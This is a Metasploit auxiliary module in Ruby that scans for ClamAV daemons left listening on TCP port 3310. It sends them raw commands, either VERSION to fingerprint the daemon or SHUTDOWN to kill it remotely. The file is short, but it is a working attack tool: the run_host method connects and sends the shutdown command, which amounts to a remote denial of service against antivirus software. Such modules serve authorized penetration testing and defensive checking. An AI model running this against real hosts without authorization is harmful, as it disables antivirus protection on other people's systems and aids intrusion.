##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'ClamAV Remote Command Transmitter',
        'Description'    => %q(
          In certain configurations, ClamAV will bind to all addresses and listen for commands.
          This module sends properly-formatted commands to the ClamAV daemon if it is in such a
          configuration.
        ),
        'Author'         => [
          'Alejandro Hdeza', # DISCOVER
          'bwatters-r7',     # MODULE
          'wvu'              # GUIDANCE
        ],
        'License'        => MSF_LICENSE,
        'References'     => [
          [ 'URL', 'https://twitter.com/nitr0usmx/status/740673507684679680/photo/1' ],
          [ 'URL', 'https://github.com/vrtadmin/clamav-faq/raw/master/manual/clamdoc.pdf' ]
        ],
        'DisclosureDate' => 'Jun 8 2016',
        'Actions'        => [
          [ 'VERSION',  'Description' => 'Get Version Information' ],
          [ 'SHUTDOWN', 'Description' => 'Kills ClamAV Daemon' ]
        ],
        'DefaultAction'  => 'VERSION'
      )
    )
    register_options(
      [
        Opt::RPORT(3310)
      ], self.class
    )
  end

  def run_host(_ip)
    begin
      connect
      sock.put(action.name + "\n")
      print_good(sock.get_once)
    rescue EOFError
      print_good('Successfully shut down ClamAV Service')
    ensure
      disconnect
    end
  end
end
